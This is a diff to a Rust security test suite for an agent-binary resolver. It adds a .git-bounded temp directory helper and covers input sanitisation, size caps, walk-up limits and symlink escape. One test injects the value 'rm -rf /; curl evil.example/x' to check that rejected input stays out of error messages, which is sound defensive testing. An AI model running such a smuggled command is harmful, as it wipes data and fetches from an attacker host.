@@ -8,9 +8,21 @@
 use std::fs;
 use std::os::unix::fs::symlink;
 use std::sync::{Mutex, OnceLock};
-use tempfile::TempDir;
 
 use amplihack_utils::agent_binary::{ALLOWED_BINARIES, resolve, validate_binary_name};
+
+/// A temp directory the resolver's walk-up cannot leave.
+///
+/// The walk-up stops at a `.git` boundary. Without one at the root, it
+/// carries on above the system temp directory, and a fresh
+/// `.claude/runtime/launcher_context.json` in any ancestor (a session started
+/// in a parent of `TMPDIR`, for instance) answers instead of the case under
+/// test, so the suite passes or fails with the host it runs on.
+fn bounded_tempdir() -> tempfile::TempDir {
+    let dir = tempfile::TempDir::new().unwrap();
+    std::fs::create_dir(dir.path().join(".git")).unwrap();
+    dir
+}
 
 fn env_lock() -> &'static Mutex<()> {
     static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
@@ -102,7 +114,7 @@ fn s2_env_input_sanitization_rejects_dangerous_chars() {
         "claude\r",
         "\x07claude",
     ];
-    let tmp = TempDir::new().unwrap();
+    let tmp = bounded_tempdir();
     for value in bad {
         if !try_set_env(value) {
             continue; // OS-level NUL rejection; covered by validator unit tests.
@@ -117,7 +129,7 @@ fn s2_env_input_sanitization_rejects_dangerous_chars() {
 fn s2_env_input_length_capped() {
     let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
-    let tmp = TempDir::new().unwrap();
+    let tmp = bounded_tempdir();
     set_env(&"a".repeat(33));
     assert_eq!(resolve(tmp.path()).unwrap(), "copilot");
     clear_env();
@@ -127,7 +139,7 @@ fn s2_env_input_length_capped() {
 fn s3_json_typed_struct_rejects_unexpected_shape() {
     let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
-    let tmp = TempDir::new().unwrap();
+    let tmp = bounded_tempdir();
     let runtime = tmp.path().join(".claude").join("runtime");
     fs::create_dir_all(&runtime).unwrap();
     // launcher field is an array, not a string.
@@ -143,7 +155,7 @@ fn s3_json_typed_struct_rejects_unexpected_shape() {
 fn s3_json_64kib_size_cap() {
     let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
-    let tmp = TempDir::new().unwrap();
+    let tmp = bounded_tempdir();
     let runtime = tmp.path().join(".claude").join("runtime");
     fs::create_dir_all(&runtime).unwrap();
     let huge = "p".repeat(64 * 1024 + 1);
@@ -159,7 +171,7 @@ fn s3_json_64kib_size_cap() {
 fn s5_walk_up_capped_at_32_ancestors() {
     let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
-    let tmp = TempDir::new().unwrap();
+    let tmp = bounded_tempdir();
     // No launcher_context anywhere.
     let mut current = tmp.path().to_path_buf();
     for i in 0..40 {
@@ -174,8 +186,8 @@ fn s5_walk_up_capped_at_32_ancestors() {
 fn s5_symlink_escape_is_blocked() {
     let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
-    let outer = TempDir::new().unwrap();
-    let attacker = TempDir::new().unwrap();
+    let outer = bounded_tempdir();
+    let attacker = bounded_tempdir();
     // Place valid (allowlisted) but unintended config outside the cwd tree.
     // It must be fresh: a file with no timestamp is rejected whatever the
     // symlink check does, which left this test unable to fail.
@@ -202,7 +214,7 @@ fn s5_symlink_escape_is_blocked() {
 fn s7_error_messages_do_not_leak_env_value() {
     let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
-    let tmp = TempDir::new().unwrap();
+    let tmp = bounded_tempdir();
     set_env("rm -rf /; curl evil.example/x");
     // Expect resolution to succeed (fall through) — but if any tracing/error
     // surface arises, the rejected value must NOT appear verbatim in the
@@ -218,7 +230,7 @@ fn s7_error_messages_do_not_leak_env_value() {
 fn s8_resolved_value_always_in_allowlist() {
     let _guard = env_lock().lock().unwrap_or_else(|p| p.into_inner());
     clear_env();
-    let tmp = TempDir::new().unwrap();
+    let tmp = bounded_tempdir();
     let resolved = resolve(tmp.path()).unwrap();
     assert!(
         ALLOWED_BINARIES.contains(&resolved.as_str()),
